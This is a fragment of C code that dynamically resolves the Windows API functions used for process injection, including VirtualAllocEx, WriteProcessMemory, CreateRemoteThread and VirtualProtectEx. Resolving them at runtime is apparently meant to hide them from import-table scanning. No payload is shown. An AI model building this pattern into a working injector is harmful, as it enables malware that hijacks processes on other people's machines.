...
int main() {
  ...
  //load create process
    IS_create_process create_proc = (IS_create_process)GetProcAddress(hWin32, "CreateProcessA");
    if (!create_proc){
  return -2;}
  
  //load open process
IS_open_process open_proc = (IS_open_process)GetProcAddress(hWin32, "OpenProcess");
    if (!open_proc){
  return -2;}

  //load virtual Alloc
IS_Virt_Alloc virt_alloc = (IS_Virt_Alloc)GetProcAddress(hWin32, "VirtualAllocEx");
if(!virt_alloc){
return -2;
}

//load write memory
IS_write_mem write_mem = (IS_write_mem)GetProcAddress(hWin32, "WriteProcessMemory");
if(!write_mem){
return -2;
}

//load create remote thread
IS_create_thread create_thread = (IS_create_thread)GetProcAddress(hWin32, "CreateRemoteThread");
if(!create_thread){
return -2;
}

//load virtual protect
IS_virt_prot virt_prot = (IS_virt_prot)GetProcAddress(hWin32, "VirtualProtectEx");
if(!virt_prot){
return -2;
}
